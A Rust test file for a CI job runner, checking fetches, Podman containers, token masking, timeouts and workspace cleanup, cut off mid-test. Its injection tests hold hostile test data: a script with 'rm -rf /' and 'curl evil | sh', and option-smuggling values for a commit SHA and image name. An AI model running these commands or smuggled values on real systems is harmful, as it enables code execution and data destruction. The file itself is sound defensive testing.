//! One job attempt with a fake process runner and a fake forge (M4 C4):
//! the argv of every call, the token's path, the timeout's kill and
//! removal, the definition hash, the clean job directory. No git, no
//! Podman, no server. Synthetic data only.
#![allow(clippy::expect_used, clippy::unwrap_used, clippy::panic)] // tests may fail loudly

use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use forge_client::error::ClientError;
use forge_errors::ErrorCode;
use sha2::{Digest, Sha256};

use crate::api::{Beat, ClaimedJob, JobResult, JobToken, RunnerApi};
use crate::git::GitPlan;
use crate::job::{Executor, GitLimits};
use crate::podman::{Limits, PodmanPlan};
use crate::process::{Cmd, Exit, ProcessRunner, Ran};
use crate::runner::{Handled, Runner};
use crate::workspace::Workspace;

const SHA: &str = "0123456789abcdef0123456789abcdef01234567";

fn image() -> String {
    format!("registry.internal/rust@sha256:{}", "a".repeat(64))
}

fn definition(script: &str) -> String {
    format!(
        "version: 1\nstages: [build]\njobs:\n  build:\n    stage: build\n    image: {}\n    timeout: 10m\n    script:\n      - {script}\n",
        image()
    )
}

fn hash(text: &str) -> String {
    Sha256::digest(text.as_bytes())
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

fn claim(job_id: i64, token: &str, def: &str) -> ClaimedJob {
    ClaimedJob {
        job_id,
        attempt: 1,
        name: "build".to_owned(),
        stage: "build".to_owned(),
        image: image(),
        timeout_s: 600,
        pipeline_id: 30 + job_id,
        project_id: 2,
        git_ref: "refs/heads/main".to_owned(),
        sha: SHA.to_owned(),
        definition_hash: Some(hash(def)),
        secrets_allowed: false,
        secret_names: Vec::new(),
        job_token: JobToken::new(token.to_owned()),
    }
}

/// How the fake container ends (`podman create`, then `podman start
/// --attach`, then `podman inspect` after a 125).
#[derive(Clone, Copy)]
enum Podman {
    /// The script exits with this code.
    Exit(i32),
    TimedOut,
    /// Exit 0 after leaving a file in the work directory.
    Litter,
    /// `podman create` fails (exit 125: the image is not known).
    CreateFails,
    /// Created, but `podman start` fails before the script runs (125;
    /// the container is still `created`).
    NeverStarted,
    /// The script runs until the stop flag is raised.
    UntilStopped,
}

/// A fake host: answers git and podman by subcommand and records every
/// call.
struct Fake {
    calls: Mutex<Vec<Cmd>>,
    definition: Mutex<String>,
    fetch_exit: i32,
    podman: Podman,
    /// The work directory of the last `podman create`.
    work: Mutex<Option<PathBuf>>,
    /// What `podman ps` prints (the containers a crashed run left).
    ps: String,
    /// What `podman pod ps` prints (the pods a crashed run left).
    pods: String,
    /// Which pod or service call fails (exit 125).
    service_fails: ServiceFails,
    /// How long each `pod create`, `create` and `start` takes; a call whose
    /// limit is shorter times out at its limit.
    delay: Duration,
    /// `podman pod rm` fails (exit 125) every time.
    pod_rm_fails: bool,
    /// What `podman logs` prints (`None`: the container does not exist).
    service_log: Option<Vec<u8>>,
}

/// Which Podman call of a job's services fails.
#[derive(Clone, Copy, PartialEq, Eq)]
enum ServiceFails {
    No,
    PodCreate,
    Create,
    Start,
}

impl Fake {
    fn new(def: &str, podman: Podman) -> Arc<Self> {
        Arc::new(Self::base(def, podman))
    }

    fn base(def: &str, podman: Podman) -> Self {
        Self {
            calls: Mutex::new(Vec::new()),
            definition: Mutex::new(def.to_owned()),
            fetch_exit: 0,
            podman,
            work: Mutex::new(None),
            ps: String::new(),
            pods: String::new(),
            service_fails: ServiceFails::No,
            delay: Duration::ZERO,
            pod_rm_fails: false,
            // A service that printed the job's token, then failed.
            service_log: Some(
                b"LOG: starting fgj_7_secret\nFATAL: data directory not writable\n".to_vec(),
            ),
        }
    }

    fn calls(&self) -> Vec<Cmd> {
        self.calls.lock().unwrap().clone()
    }

    fn by(&self, program: &str, sub: &str) -> Vec<Cmd> {
        self.calls()
            .into_iter()
            .filter(|c| c.program_name() == program && subcommand(c) == sub)
            .collect()
    }
}

/// The subcommand of a recorded call (git's comes after `-C <dir>`).
fn subcommand(c: &Cmd) -> String {
    let argv = c.argv();
    if c.program_name() == "git" {
        let at = argv.iter().position(|a| a == "-C").expect("-C");
        argv[at + 2].clone()
    } else if argv[0] == "pod" {
        format!("pod {}", argv[1])
    } else {
        argv[0].clone()
    }
}

/// A service container's call (its name has `-svc-`).
fn is_service(c: &Cmd) -> bool {
    c.argv()
        .iter()
        .any(|a| a.contains("-svc-") && !a.starts_with("--pod="))
}

fn work_mount(c: &Cmd) -> PathBuf {
    let arg = c
        .argv()
        .into_iter()
        .find(|a| a.starts_with("--volume=") && a.ends_with(":/workspace:rw,Z"))
        .expect("work mount");
    let inner = arg
        .strip_prefix("--volume=")
        .and_then(|a| a.strip_suffix(":/workspace:rw,Z"))
        .expect("path");
    PathBuf::from(inner)
}

impl ProcessRunner for Fake {
    fn run(
        &self,
        cmd: &Cmd,
        limit: Duration,
        stop: &dyn Fn() -> bool,
        out: &mut dyn FnMut(&[u8]),
    ) -> std::io::Result<Ran> {
        self.calls.lock().unwrap().push(cmd.clone());
        let sub = subcommand(cmd);
        let slow = cmd.program_name() == "podman"
            && ["pod create", "create", "start"].contains(&sub.as_str());
        if slow && !self.delay.is_zero() {
            if limit < self.delay {
                std::thread::sleep(limit);
                return Ok(Ran {
                    exit: Exit::TimedOut,
                    stdout: Vec::new(),
                    stderr_tail: String::new(),
                });
            }
            std::thread::sleep(self.delay);
        }
        let ok = |stdout: Vec<u8>| Ran {
            exit: Exit::Code(0),
            stdout,
            stderr_tail: String::new(),
        };
        Ok(match (cmd.program_name().as_str(), sub.as_str()) {
            ("git", "fetch") if self.fetch_exit != 0 => Ran {
                exit: Exit::Code(self.fetch_exit),
                stdout: Vec::new(),
                stderr_tail: "fatal: remote error".to_owned(),
            },
            ("git", "rev-parse") => ok(format!("{SHA}\n").into_bytes()),
            ("git", "cat-file") => ok(self.definition.lock().unwrap().clone().into_bytes()),
            ("git", _) => ok(Vec::new()),
            ("podman", "pod create") if self.service_fails == ServiceFails::PodCreate => Ran {
                exit: Exit::Code(125),
                stdout: Vec::new(),
                stderr_tail: "Error: building the pause image".to_owned(),
            },
            ("podman", "create") if is_service(cmd) => {
                if self.service_fails == ServiceFails::Create {
                    Ran {
                        exit: Exit::Code(125),
                        stdout: Vec::new(),
                        stderr_tail: "Error: postgres image not known".to_owned(),
                    }
                } else {
                    ok(b"5678abcd\n".to_vec())
                }
            }
            ("podman", "start") if is_service(cmd) => {
                if self.service_fails == ServiceFails::Start {
                    Ran {
                        exit: Exit::Code(125),
                        stdout: Vec::new(),
                        stderr_tail: "Error: crun: mount tmpfs".to_owned(),
                    }
                } else {
                    ok(b"started\n".to_vec())
                }
            }
            ("podman", "logs") => match &self.service_log {
                Some(log) => {
                    out(log);
                    ok(Vec::new())
                }
                None => Ran {
                    exit: Exit::Code(125),
                    stdout: Vec::new(),
                    stderr_tail: "Error: no such container forge-job-7-1-svc-db".to_owned(),
                },
            },
            ("podman", "pod rm") if self.pod_rm_fails => Ran {
                exit: Exit::Code(125),
                stdout: Vec::new(),
                stderr_tail: "Error: removing pod: device or resource busy".to_owned(),
            },
            ("podman", "pod ps") => ok(self.pods.clone().into_bytes()),
            ("podman", "create") => match self.podman {
                Podman::CreateFails => Ran {
                    exit: Exit::Code(125),
                    stdout: Vec::new(),
                    stderr_tail: "Error: image not known".to_owned(),
                },
                Podman::Exit(_)
                | Podman::TimedOut
                | Podman::Litter
                | Podman::NeverStarted
                | Podman::UntilStopped => {
                    *self.work.lock().unwrap() = Some(work_mount(cmd));
                    ok(b"0123abcd\n".to_vec())
                }
            },
            ("podman", "start") => match self.podman {
                Podman::Exit(0) => {
                    out(b"hello from the job\n");
                    ok(Vec::new())
                }
                Podman::Exit(code) => Ran {
                    exit: Exit::Code(code),
                    stdout: Vec::new(),
                    stderr_tail: String::new(),
                },
                Podman::NeverStarted => Ran {
                    exit: Exit::Code(125),
                    stdout: Vec::new(),
                    stderr_tail: "Error: OCI runtime error: unable to start".to_owned(),
                },
                Podman::TimedOut => Ran {
                    exit: Exit::TimedOut,
                    stdout: Vec::new(),
                    stderr_tail: String::new(),
                },
                Podman::Litter => {
                    let work = self.work.lock().unwrap().clone().expect("created");
                    assert_eq!(
                        std::fs::read_dir(&work).expect("work").count(),
                        0,
                        "a job starts in an empty work directory"
                    );
                    std::fs::write(work.join("left-by-the-job"), b"x").expect("litter");
                    ok(Vec::new())
                }
                Podman::CreateFails => panic!("never started"),
                Podman::UntilStopped => {
                    let until = std::time::Instant::now() + Duration::from_secs(20);
                    while !stop() {
                        assert!(std::time::Instant::now() < until, "never stopped");
                        std::thread::sleep(Duration::from_millis(20));
                    }
                    Ran {
                        exit: Exit::Stopped,
                        stdout: Vec::new(),
                        stderr_tail: String::new(),
                    }
                }
            },
            ("podman", "ps") => ok(self.ps.clone().into_bytes()),
            ("podman", "inspect") => match self.podman {
                Podman::NeverStarted => ok(b"created 0\n".to_vec()),
                Podman::Exit(code) => ok(format!("exited {code}\n").into_bytes()),
                Podman::TimedOut | Podman::Litter | Podman::CreateFails | Podman::UntilStopped => {
                    ok(b"exited 0\n".to_vec())
                }
            },
            _ => ok(Vec::new()),
        })
    }
}

/// A fake forge: records log chunks and results.
#[derive(Default)]
struct Forge {
    logs: Mutex<Vec<String>>,
    completed: Mutex<Vec<(i64, JobResult, Option<i32>)>>,
    claims: Mutex<Vec<ClaimedJob>>,
    /// The forge cannot be reached: every claim fails as the client reports it.
    unreachable: AtomicBool,
}

impl RunnerApi for Forge {
    fn request_job(&self, _: u64) -> Result<Option<ClaimedJob>, ClientError> {
        if self.unreachable.load(Ordering::SeqCst) {
            return Err(ClientError::local(
                ErrorCode::CliServerUnreachable,
                "reason=connect",
            ));
        }
        Ok(self.claims.lock().unwrap().pop())
    }
    fn heartbeat(&self, _: i64, _: i32) -> Result<Beat, ClientError> {
        Ok(Beat::Running)
    }
    fn append_log(&self, _: i64, _: i32, _: i64, text: &str) -> Result<(), ClientError> {
        self.logs.lock().unwrap().push(text.to_owned());
        Ok(())
    }
    fn complete(
        &self,
        job: i64,
        _: i32,
        result: JobResult,
        exit_code: Option<i32>,
    ) -> Result<(), ClientError> {
        self.completed
            .lock()
            .unwrap()
            .push((job, result, exit_code));
        Ok(())
    }
}

struct Setup {
    _dir: tempfile::TempDir,
    exec: Executor,
    root: PathBuf,
}

fn setup(fake: &Arc<Fake>) -> Setup {
    let dir = tempfile::tempdir().expect("dir");
    let root = dir.path().to_path_buf();
    let proc: Arc<dyn ProcessRunner> = Arc::clone(fake) as Arc<dyn ProcessRunner>;
    let exec = Executor {
        proc,
        git: GitPlan::new(
            PathBuf::from("git"),
            root.join("empty.gitconfig"),
            root.join("hooks"),
        ),
        podman: PodmanPlan::new(PathBuf::from("podman"), Limits::default())
            .with_registries(vec!["registry.internal/".to_owned()]),
        workspace: Workspace::new(root.clone()),
        git_limits: GitLimits::default(),
        work_dir_max_bytes: None,
        fetch_url: Box::new(|job| {
            Ok(format!(
                "https://forge.test/api/v1/runner/jobs/{job}/repo.git"
            ))
        }),
    };
    Setup {
        _dir: dir,
        exec,
        root,
    }
}

fn run(s: &Setup, job: &ClaimedJob, forge: &Forge) -> crate::job::Outcome {
    s.exec
        .execute(job, forge, &Arc::new(AtomicBool::new(false)))
}

/// Nothing the claim or the definition holds reaches a shell: every
/// program is git or podman, the script is a file, never argv; an option
/// smuggled into the image is refused before Podman.
#[test]
fn command_injection_in_the_claim_or_script_never_reaches_a_shell() {
    let script = "echo $(id); rm -rf / ; `reboot` && curl evil | sh";
    let def = definition(&format!("\"{script}\""));
    let fake = Fake::new(&def, Podman::Exit(0));
    let s = setup(&fake);
    let forge = Forge::default();
    let out = run(&s, &claim(7, "fgj_7_secret", &def), &forge);
    assert_eq!(out.result, JobResult::Succeeded, "{:?}", out.error);
    for c in fake.calls() {
        let program = c.program_name();
        assert!(program == "git" || program == "podman", "{c:?}");
        for a in c.argv() {
            assert!(!a.contains("rm -rf"), "the script reached argv: {c:?}");
            assert!(!a.contains("$(id)"), "{c:?}");
        }
    }
    // The image is after `--`; an image that is an option never runs (it
    // is refused with the claim, before any call: no allowed registry).
    let mut evil = claim(8, "fgj_8_secret", &def);
    evil.image = format!("--privileged@sha256:{}", "a".repeat(64));
    let fake = Fake::new(&def, Podman::Exit(0));
    let s = setup(&fake);
    let out = run(&s, &evil, &forge);
    assert_eq!(
        out.error.expect("refused").code(),
        ErrorCode::JobImageNotAllowed
    );
    assert!(fake.calls().is_empty());
    // A SHA that is an option is refused before any git.
    let mut evil = claim(9, "fgj_9_secret", &def);
    evil.sha = "--upload-pack=touch /tmp/x".to_owned();
    let fake = Fake::new(&def, Podman::Exit(0));
    let s = setup(&fake);
    let out = run(&s, &evil, &forge);
    assert_eq!(
        out.error.expect("refused").code(),
        ErrorCode::JobDefinitionMismatch
    );
    assert!(fake.calls().is_empty());
}

#[test]
fn a_job_past_its_timeout_kills_and_removes_its_container() {
    let def = definition("sleep 100000");
    let fake = Fake::new(&def, Podman::TimedOut);
    let s = setup(&fake);
    let forge = Forge::default();
    let out = run(&s, &claim(7, "fgj_7_secret", &def), &forge);
    assert_eq!(out.result, JobResult::Failed);
    assert_eq!(out.error.expect("timed out").code(), ErrorCode::JobTimedOut);
    let kill = fake.by("podman", "kill");
    assert_eq!(kill.len(), 1);
    assert_eq!(
        kill[0].argv(),
        ["kill", "--signal=KILL", "--", "forge-job-7-1"]
    );
    let rm = fake.by("podman", "rm");
    assert_eq!(rm.len(), 1);
    assert_eq!(
        rm[0].argv(),
        ["rm", "--force", "--ignore", "--", "forge-job-7-1"]
    );
    // Kill, then remove.
    let order: Vec<String> = fake
        .calls()
        .iter()
        .filter(|c| c.program_name() == "podman")
        .map(subcommand)
        .collect();
    assert_eq!(order, ["create", "start", "kill", "rm"]);
    assert!(s.exec.workspace.is_clean());
    let logs = forge.logs.lock().unwrap().join("");
    assert!(logs.contains("FG-CI-0010"), "{logs}");
}

#[test]
fn the_work_directory_is_wiped_between_jobs() {
    let def = definition("make");
    let fake = Fake::new(&def, Podman::Litter);
    let s = setup(&fake);
    let forge = Forge::default();
    for job in [7, 8] {
        // The fake asserts the work directory is empty when the container
        // starts, then leaves a file behind.
        let out = run(&s, &claim(job, &format!("fgj_{job}_secret"), &def), &forge);
        assert_eq!(out.result, JobResult::Succeeded, "{:?}", out.error);
        assert!(!out.workspace_dirty);
        assert!(s.exec.workspace.is_clean(), "job {job} left its directory");
        assert!(!s.root.join("job").exists());
    }
}

/// Each job's fetch carries its own token, in git's environment only; the
/// container never gets one; the log masks it.
#[test]
fn a_job_token_is_never_reused_across_jobs() {
    let def = definition("echo fgj_7_secret");
    let fake = Fake::new(&def, Podman::Exit(0));
    let s = setup(&fake);
    let forge = Forge::default();
    run(&s, &claim(7, "fgj_7_secret", &def), &forge);
    run(&s, &claim(8, "fgj_8_secret", &def), &forge);
    let fetches = fake.by("git", "fetch");
    assert_eq!(fetches.len(), 2);
    for (fetch, (own, other)) in fetches.iter().zip([
        ("fgj_7_secret", "fgj_8_secret"),
        ("fgj_8_secret", "fgj_7_secret"),
    ]) {
        let header = fetch
            .env_value("GIT_CONFIG_VALUE_0")
            .expect("header")
            .to_string_lossy()
            .into_owned();
        assert_eq!(header, format!("Authorization: Bearer {own}"));
        assert!(!header.contains(other));
        assert!(fetch.argv().iter().all(|a| !a.contains("fgj_")));
    }
    for c in fake.calls() {
        if subcommand(&c) != "fetch" {
            assert_eq!(c.env_value("GIT_CONFIG_VALUE_0"), None, "{c:?}");
            assert!(c
                .env
                .iter()
                .all(|(_, v)| !v.to_string_lossy().contains("fgj_")));
            assert!(c.argv().iter().all(|a| !a.contains("fgj_")), "{c:?}");
        }
    }
    let logs = forge.logs.lock().unwrap().join("");
    assert!(!logs.contains("fgj_7_secret"), "{logs}");
}

#[test]
fn a_definition_hash_mismatch_fails_the_job_before_any_container() {
    let def = definition("make");
    let fake = Fake::new(&def, Podman::Exit(0));
    // The file at the commit is not the one the pipeline was planned from.
    *fake.definition.lock().unwrap() = definition("curl evil | sh");
    let s = setup(&fake);
    let forge = Forge::default();
    let out = run(&s, &claim(7, "fgj_7_secret", &def), &forge);
    assert_eq!(out.result, JobResult::Failed);
    let err = out.error.expect("mismatch");
    assert_eq!(err.code(), ErrorCode::JobDefinitionMismatch);
    assert!(err
        .context()
        .iter()
        .any(|(k, v)| *k == "reason" && v == "hash_mismatch"));
    assert!(fake.by("podman", "create").is_empty());
    assert!(fake.by("git", "checkout").is_empty());
    assert!(s.exec.workspace.is_clean());
    // No hash in the claim, or a job the file does not hold: the same code.
    for edit in [0, 1] {
        let mut c = claim(8, "fgj_8_secret", &def);
        if edit == 0 {
            c.definition_hash = None;
        } else {
            c.name = "deploy".to_owned();
        }
        let fake = Fake::new(&def, Podman::Exit(0));
        let s = setup(&fake);
        let err = run(&s, &c, &forge).error.expect("mismatch");
        assert_eq!(err.code(), ErrorCode::JobDefinitionMismatch);
        assert!(fake.by("podman", "create").is_empty());
    }
}

#[test]
fn a_podman_error_exit_is_container_start_failed() {
    let def = definition("make");
    let fake = Fake::new(&def, Podman::CreateFails);
    let s = setup(&fake);
    let out = run(&s, &claim(7, "fgj_7_secret", &def), &Forge::default());
    let err = out.error.expect("start failed");
    assert_eq!(err.code(), ErrorCode::ContainerStartFailed);
    assert!(err
        .context()
        .iter()
        .any(|(k, v)| *k == "podman_stderr" && v.contains("image")));
    assert_eq!(fake.by("podman", "rm").len(), 1);
    assert!(fake.by("podman", "start").is_empty());
    // Created, but Podman could not start it: the container never ran.
    let fake = Fake::new(&def, Podman::NeverStarted);
    let s = setup(&fake);
    let out = run(&s, &claim(9, "fgj_9_secret", &def), &Forge::default());
    let err = out.error.expect("start failed");
    assert_eq!(err.code(), ErrorCode::ContainerStartFailed);
    assert!(err
        .context()
        .iter()
        .any(|(k, v)| *k == "podman_stderr" && v.contains("OCI")));
    assert_eq!(fake.by("podman", "rm").len(), 1);
    // M4 C4 review: the script's own exit 125 is the script's failure,
    // not Podman's (the container ran and exited with it).
    let fake = Fake::new(&def, Podman::Exit(125));
    let s = setup(&fake);
    let out = run(&s, &claim(10, "fgj_10_secret", &def), &Forge::default());
    assert_eq!(out.result, JobResult::Failed);
    assert_eq!(out.exit_code, Some(125));
    assert!(out.error.is_none(), "{:?}", out.error);
    assert_eq!(fake.by("podman", "inspect").len(), 1);
    // The script's own failure is a plain failed result with its code.
    let fake = Fake::new(&def, Podman::Exit(3));
    let s = setup(&fake);
    let out = run(&s, &claim(8, "fgj_8_secret", &def), &Forge::default());
    assert_eq!(out.result, JobResult::Failed);
    assert_eq!(out.exit_code, Some(3));
    assert!(out.error.is_none());
}

#[test]
fn a_failed_fetch_is_job_fetch_failed() {
    let def = definition("make");
    let fake = Arc::new(Fake {
        fetch_exit: 128,
        ..Fake::base(&def, Podman::Exit(0))
    });
    let s = setup(&fake);
    let out = run(&s, &claim(7, "fgj_7_secret", &def), &Forge::default());
    let err = out.error.expect("fetch failed");
    assert_eq!(err.code(), ErrorCode::JobFetchFailed);
    assert!(err
        .context()
        .iter()
        .any(|(k, v)| *k == "step" && v == "fetch"));
    assert!(err
        .context()
        .iter()
        .all(|(_, v)| !v.contains("fgj_7_secret")));
    assert!(fake.by("podman", "create").is_empty());
    assert!(s.exec.workspace.is_clean());
}

/// A claim that cannot reach the forge keeps the client's diagnosis class in
/// the error the loop logs (`forge.runner.claim_failed`).
#[test]
fn an_unreachable_forge_keeps_the_reason_in_the_claim_error() {
    let def = definition("make");
    let fake = Fake::new(&def, Podman::Exit(0));
    let s = setup(&fake);
    let forge = Arc::new(Forge::default());
    forge.unreachable.store(true, Ordering::SeqCst);
    let runner = Runner {
        api: Arc::clone(&forge) as Arc<dyn RunnerApi>,
        exec: s.exec,
        heartbeat_every: Duration::from_millis(50),
        shutdown: Arc::new(AtomicBool::new(false)),
    };
    let Err(e) = runner.run_once(0) else {
        panic!("an unreachable forge is an error");
    };
    assert_eq!(e.code(), ErrorCode::CliServerUnreachable);
    assert!(e
        .context()
        .iter()
        .any(|(k, v)| *k == "detail" && v == "reason=connect"));
    assert!(forge.completed.lock().unwrap().is_empty());
}

/// The loop: a claimed job is run and its result reported.
#[test]
fn a_claimed_job_is_run_and_reported() {
    let def = definition("make");
    let fake = Fake::new(&def, Podman::Exit(0));
    let s = setup(&fake);
    let forge = Arc::new(Forge::default());
    forge
        .claims
        .lock()
        .unwrap()
        .push(claim(7, "fgj_7_secret", &def));
    let runner = Runner {
        api: Arc::clone(&forge) as Arc<dyn RunnerApi>,
        exec: s.exec,
        heartbeat_every: Duration::from_millis(50),
        shutdown: Arc::new(AtomicBool::new(false)),
    };
    match runner.run_once(0).expect("claim") {
        Handled::Ran {
            job_id, reported, ..
        } => {
            assert_eq!(job_id, 7);
            assert!(reported);
        }
        Handled::Idle => panic!("a job was waiting"),
    }
    assert_eq!(
        forge.completed.lock().unwrap().as_slice(),
        [(7, JobResult::Succeeded, Some(0))]
    );
    assert!(matches!(runner.run_once(0).expect("claim"), Handled::Idle));
    let logs = forge.logs.lock().unwrap().join("");
    assert!(logs.contains("hello from the job"), "{logs}");
}

/// Real rootless Podman on the runner host (plan 14 §10.1: the Linux host
/// is not provisioned yet; development is on Windows).
#[test]
#[ignore = "needs a Linux host with rootless Podman and the image in the local store; run on the runner host with --run-ignored"]
fn a_real_container_runs_without_network_and_is_removed() {
    use crate::process::SystemRunner;
    let image = std::env::var("FORGE_RUNNER_TEST_IMAGE").expect("FORGE_RUNNER_TEST_IMAGE");
    let dir = tempfile::tempdir().expect("dir");
    let work = dir.path().join("work");
    let script = dir.path().join("script");
    std::fs::create_dir_all(&work).expect("work");
    std::fs::create_dir_all(&script).expect("script");
    std::fs::write(
        script.join("script.sh"),
        "touch /workspace/ok\n! wget -q -T 3 http://example.invalid/ 2>/dev/null\n! touch /etc/x 2>/dev/null\n",
    )
    .expect("script");
    let plan = PodmanPlan::new(PathBuf::from("podman"), Limits::default());
    let create = plan.create(&crate::podman::Container {
        name: "forge-job-test-1",
        image: &image,
        work: &work,
        script_dir: &script,
        job_id: 1,
        pipeline_id: 1,
        project_id: 1,
        sha: SHA,
        pod: None,
    });
    let created = SystemRunner
        .run(&create, Duration::from_secs(120), &|| false, &mut |_| {})
        .expect("podman create");
    assert!(created.ok(), "{created:?}");
    let ran = SystemRunner
        .run(
            &plan.start("forge-job-test-1"),
            Duration::from_secs(120),
            &|| false,
            &mut |_| {},
        )
        .expect("podman start");
    assert!(ran.ok(), "{ran:?}");
    assert!(work.join("ok").exists());
    let state = SystemRunner
        .run(
            &plan.state("forge-job-test-1"),
            Duration::from_secs(60),
            &|| false,
            &mut |_| {},
        )
        .expect("inspect");
    assert_eq!(String::from_utf8_lossy(&state.stdout).trim(), "exited 0");
    let rm = SystemRunner
        .run(
            &plan.remove("forge-job-test-1"),
            Duration::from_secs(60),
            &|| false,
            &mut |_| {},
        )
        .expect("rm");
    assert!(rm.ok());
}

/// The git argv against the real git (2.38+): every call is accepted as
/// written (a usage error would be exit 129), the fetch fails only for the
/// unreachable server, and the pinned commit is checked out and read.
#[test]
fn the_git_calls_run_as_written_on_the_real_git() {
    use crate::process::SystemRunner;
    use std::process::Command;
    let dir = tempfile::tempdir().expect("dir");
    let work = dir.path().join("work");
    std::fs::create_dir_all(&work).expect("work");
    let hooks = dir.path().join("hooks");
    std::fs::create_dir_all(&hooks).expect("hooks");
    let empty = dir.path().join("empty.gitconfig");
    std::fs::write(&empty, b"").expect("config");
    let plan = GitPlan::new(PathBuf::from("git"), empty, hooks);
    let run = |cmd: &Cmd| {
        SystemRunner
            .run(cmd, Duration::from_secs(60), &|| false, &mut |_| {})
            .expect("git")
    };
    assert!(run(&plan.init(&work)).ok());
    // The fetch's argv parses; only the connection fails.
    let fetch = plan.fetch(
        &work,
        "http://127.0.0.1:9/api/v1/runner/jobs/1/repo.git",
        1,
        &JobToken::new("fgj_1_secret".to_owned()),
    );
    let ran = run(&fetch);
    assert!(
        matches!(ran.exit, Exit::Code(c) if c != 0 && c != 129),
        "{ran:?}"
    );
    assert!(!ran.stderr_tail.contains("fgj_1_secret"));
    // Stand in for the fetch: a commit at refs/forge/job.
    let git = |args: &[&str]| {
        let out = Command::new("git")
            .arg("-C")
            .arg(&work)
            .args(args)
            .env("GIT_AUTHOR_NAME", "forge-test")
            .env("GIT_AUTHOR_EMAIL", "forge-test@example.invalid")
            .env("GIT_COMMITTER_NAME", "forge-test")
            .env("GIT_COMMITTER_EMAIL", "forge-test@example.invalid")
            .output()
            .expect("git");
        assert!(out.status.success(), "{args:?}");
        String::from_utf8_lossy(&out.stdout).trim().to_owned()
    };
    std::fs::write(work.join(".forge-ci.yml"), definition("make")).expect("file");
    git(&["add", ".forge-ci.yml"]);
    git(&["commit", "-q", "-m", "synthetic"]);
    let sha = git(&["rev-parse", "HEAD"]);
    git(&["update-ref", "refs/forge/job", &sha]);
    let oid = forge_core::ObjectId::parse(&sha).expect("sha");
    let fetched = run(&plan.fetched(&work));
    assert!(fetched.ok(), "{fetched:?}");
    assert_eq!(String::from_utf8_lossy(&fetched.stdout).trim(), sha);
    let def = run(&plan.definition(&work, &oid));
    assert!(def.ok(), "{def:?}");
    assert_eq!(String::from_utf8_lossy(&def.stdout), definition("make"));
    let checkout = run(&plan.checkout(&work, &oid));
    assert!(checkout.ok(), "{checkout:?}");
}

/// M4 C4 review: an image outside the configured registries is refused
/// before any git call, pull or container (FG-CI-0011).
#[test]
fn an_image_outside_the_allowed_registries_is_refused_before_any_call() {
    let def = definition("make");
    let fake = Fake::new(&def, Podman::Exit(0));
    let s = setup(&fake);
    let forge = Forge::default();
    for image in [
        format!("docker.io/library/alpine@sha256:{}", "a".repeat(64)),
        // A look-alike host: the prefix ends at a `/`.
        format!("registry.internal.evil.test/rust@sha256:{}", "a".repeat(64)),
    ] {
        let mut c = claim(7, "fgj_7_secret", &def);
        c.image = image.clone(); // clone: the assertion names it
        let out = run(&s, &c, &forge);
        assert_eq!(out.result, JobResult::Failed);
        let err = out.error.expect("refused");
        assert_eq!(err.code(), ErrorCode::JobImageNotAllowed, "{image}");
        assert!(fake.calls().is_empty(), "{:?}", fake.calls());
    }
    let logs = forge.logs.lock().unwrap().join("");
    assert!(logs.contains("FG-CI-0011"), "{logs}");
}

/// M4 C4 review: a job whose work directory grew past
/// `work_dir_max_bytes` fails (FG-CI-0012) and the directory is wiped;
/// within the bound (or unbounded) the same job succeeds.
#[test]
fn a_work_directory_past_its_bound_fails_the_job_and_is_wiped() {
    let def = definition("make");
    let fake = Fake::new(&def, Podman::Litter);
    let mut s = setup(&fake);
    s.exec.work_dir_max_bytes = Some(0);
    let forge = Forge::default();
    let out = run(&s, &claim(7, "fgj_7_secret", &def), &forge);
    assert_eq!(out.result, JobResult::Failed);
    let err = out.error.expect("too large");
    assert_eq!(err.code(), ErrorCode::JobWorkspaceTooLarge);
    assert!(err
        .context()
        .iter()
        .any(|(k, v)| *k == "limit_bytes" && v == "0"));
    assert!(s.exec.workspace.is_clean());
    let logs = forge.logs.lock().unwrap().join("");
    assert!(logs.contains("FG-CI-0012"), "{logs}");
    s.exec.work_dir_max_bytes = Some(1 << 20);
    let out = run(&s, &claim(8, "fgj_8_secret", &def), &forge);
    assert_eq!(out.result, JobResult::Succeeded, "{:?}", out.error);
}

/// M4 C4 review: a shutdown (SIGTERM / Ctrl-C) during a job stops it,
/// kills and removes its container, reports it and ends the loop.
#[test]
fn a_shutdown_kills_and_removes_the_running_container() {
    let def = definition("sleep 100000");
    let fake = Fake::new(&def, Podman::UntilStopped);
    let s = setup(&fake);
    let forge = Arc::new(Forge::default());
    forge
        .claims
        .lock()
        .unwrap()
        .push(claim(7, "fgj_7_secret", &def));
    let shutdown = Arc::new(AtomicBool::new(false));
    let runner = Runner {
        api: Arc::clone(&forge) as Arc<dyn RunnerApi>,
        exec: s.exec,
        heartbeat_every: Duration::from_secs(30),
        shutdown: Arc::clone(&shutdown),
    };
    let signal = {
        let (fake, shutdown) = (Arc::clone(&fake), Arc::clone(&shutdown));
        std::thread::spawn(move || {
            // The signal arrives once the container is running.
            let until = std::time::Instant::now() + Duration::from_secs(20);
            while fake.by("podman", "start").is_empty() {
                assert!(std::time::Instant::now() < until, "never started");
                std::thread::sleep(Duration::from_millis(20));
            }
            shutdown.store(true, std::sync::atomic::Ordering::SeqCst);
        })
    };
    let started = std::time::Instant::now();
    runner.run_forever().expect("a clean stop");
    signal.join().expect("signal thread");
    assert!(started.elapsed() < Duration::from_secs(15));
    let order: Vec<String> = fake
        .calls()
        .iter()
        .filter(|c| c.program_name() == "podman")
        .map(subcommand)
        .collect();
    assert_eq!(order, ["create", "start", "kill", "rm"]);
    assert_eq!(
        forge.completed.lock().unwrap().as_slice(),
        [(7, JobResult::Failed, None)]
    );
    assert!(runner.exec.workspace.is_clean());
}

/// M4 C4 review: at startup every container a crashed run left
/// (`forge-job-<job>-<attempt>`) is removed; another name is left alone.
#[test]
fn stale_job_containers_are_removed_at_startup() {
    let def = definition("make");
    let fake = Arc::new(Fake {
        ps: "forge-job-7-1\nforge-job-12-3\nforge-job-x\nforge-job-7-1-svc-db\n".to_owned(),
        pods: "forge-job-7-1\nforge-job-9-2\nother-pod\n".to_owned(),
        service_fails: ServiceFails::No,
        ..Fake::base(&def, Podman::Exit(0))
    });
    let s = setup(&fake);
    assert_eq!(s.exec.remove_stale_containers().expect("removed"), 4);
    let ps = fake.by("podman", "ps");
    assert_eq!(ps.len(), 1);
    assert_eq!(
        ps[0].argv(),
        [
            "ps",
            "--all",
            "--filter=name=^forge-job-",
            "--format={{.Names}}"
        ]
    );
    let removed: Vec<Vec<String>> = fake.by("podman", "rm").iter().map(Cmd::argv).collect();
    assert_eq!(
        removed,
        [
